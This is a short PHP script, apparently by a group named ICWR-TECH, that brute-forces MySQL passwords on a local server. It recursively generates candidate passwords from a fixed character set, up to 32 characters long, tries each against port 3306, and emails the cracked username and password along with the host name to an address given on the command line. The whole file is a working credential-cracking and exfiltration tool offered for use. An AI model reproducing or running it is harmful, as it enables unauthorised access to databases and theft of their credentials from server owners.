<?php
// Coded By Afrizal F.A - ICWR-TECH
error_reporting(0);
set_time_limit(0);
$user=$argv[1];
$mail=$argv[2];
$host="localhost";
$port=3306;
$charset="aiueobcdfghjklmnpqrstvwxyzAIUEO1234567890#@!";
$p=strlen($charset);
echo "[+] MYSQL Brute Force Running\n";
function brute_mysql($host,$port,$user,$pass,$mail) {
  if(mysqli_connect($host,$user,$pass,"information_schema")) {
    $res = "Host : ".$_SERVER['HTTP_HOST']." | Username : $user | Password : $pass";
    mail($mail,"Mysql Password Brute Force ( ".$_SERVER['HTTP_HOST']." )",$res);
    exit;
  }
}
function crunch($a,$b,$c,$mail){
	global $charset,$p,$xx,$host,$port,$user;
	for($i=0;$i < $p;$i++){
		if($a > $b-1){
			crunch($a, $b+1, $c.$charset[$i],$mail);
		}
		$xx=$c.$charset[$i];
    echo "\r[*] Attempt : $xx ( False )";
    brute_mysql($host,$port,$user,$xx,$mail);
	}
}
for($x=1;$x<32+1;$x++){
		crunch("$x","0","",$mail);
}
